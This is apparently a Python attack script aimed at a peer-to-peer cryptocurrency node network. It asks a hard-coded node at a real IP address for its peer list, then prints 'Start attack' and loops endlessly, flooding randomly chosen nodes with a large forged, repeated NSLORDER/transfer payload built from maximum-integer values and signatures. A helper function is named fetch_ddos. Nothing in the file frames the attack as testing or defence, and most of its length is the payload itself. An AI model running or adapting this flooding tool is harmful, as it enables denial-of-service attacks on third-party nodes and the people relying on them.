import json
import random
from typing import List, Dict, Optional
import httpx
import asyncio
import socket
import re
class Seed:
    
    def __init__(self, ip="4.233.61.8", port=8080, address="", ping=0, online=False):
        self.ip = ip
        self.port = port

    def __repr__(self):
        return f"Seed(ip='{self.ip}', port={self.port})"


def send_tcp_request(target_ip, target_port, message):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)  # Встановлення тайм-ауту в 5 секунд

    try:
        sock.connect((target_ip, target_port))

        sock.sendall(message.encode())

        response = sock.recv(4096)

        return response.decode()
    
    except socket.timeout:
        print("Помилка: тайм-аут з'єднання.")
    
    except Exception as e:
        print(f"Помилка: {e}")
    
    finally:
        # Закриття сокета
        sock.close()

async def fetch_ddos(command: str, seed: Seed):
    try:
        reader, writer = await asyncio.open_connection(seed.ip, seed.port)
        writer.write(command.encode())
        await writer.drain()
        response = await reader.read(4096) 
        print(f"Received response: {response.decode()}")
        writer.close()
        await writer.wait_closed()
    except Exception as e:
        print(f"Error in fetch_ddos: {e}")


async def main():
    lol_message =  """
NSLORDER 2147483647 1.61 1701894157 ORDER 2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 $TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,,,,,
"""

    results = []
    seedP = Seed(ip= "4.233.61.8", port= 8080)
    
    print("Start test target node")
    testDef = send_tcp_request(target_ip= seedP.ip, target_port=seedP.port, message="NODESTATUS\n")
    
    if testDef.startswith("NODESTATUS"):
       nodes_list_check = send_tcp_request(target_ip= seedP.ip, target_port=seedP.port, message="NSLMNS\n")
       pattern = re.compile(r"(\d+\.\d+\.\d+\.\d+);(\d+):([A-Za-z0-9]+):(\d+)")


       for match in pattern.finditer(nodes_list_check):
           ip_address = match.group(1)
           port = match.group(2)
    
           results.append({
           "ip_address": ip_address,
           "port": port,
           })

       print(len(results))
       print("Start attack")

       while True:
           for _ in range(40000):
            result = random.choice(results)
            ip_address = result["ip_address"]
            port = int(result["port"])
            print(f"{ip_address}:{port}")
            try:
                reps =  send_tcp_request(target_ip=ip_address, target_port=port, message=lol_message)
                print(reps)
            except Exception as e:
                print(f"Error sending request: {e}")
    

    else:
         print("Start node OUT")

if __name__ == "__main__":
    asyncio.run(main())
